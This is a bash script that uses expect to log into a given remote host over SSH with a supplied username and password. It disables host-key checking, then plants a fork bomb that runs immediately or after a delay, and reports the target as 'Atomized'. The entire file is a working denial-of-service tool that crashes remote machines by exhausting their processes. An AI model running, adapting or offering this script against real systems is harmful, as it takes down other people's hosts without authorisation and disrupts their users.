#!/bin/bash

do_bomb () {
	current_target=$1
	username=$2
	password=$3
	random_time=$4
	connect_adress="$username@$current_target"
	#random_time=$((RANDOM % 10 + 2))
	
	if [[ "$random_time" == 0 ]]; then
		final_command=":(){ :|: & };:"
		time_to_death="*"
		
	else
		final_command=":(){ sleep $random_time && :|: & };:"
		time_to_death=$(bc <<< "scale=1;$random_time*3/10")
	fi

	ssh-keygen -R $connect_adress 2> /dev/null

~/tools/librairies/expect-5.45/expect << EOD
log_user 0
spawn ssh -o PubkeyAuthentication=false -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $connect_adress

expect "assword:"
send -- "$password\r"
send -- "\r"

expect "$ "
send -- "$final_command\r"

expect "$ "
send -- "exit\r"

expect eof
EOD

	echo "   > Atomized $current_target (~$time_to_death min)."
	exit 0
}

do_bomb $*
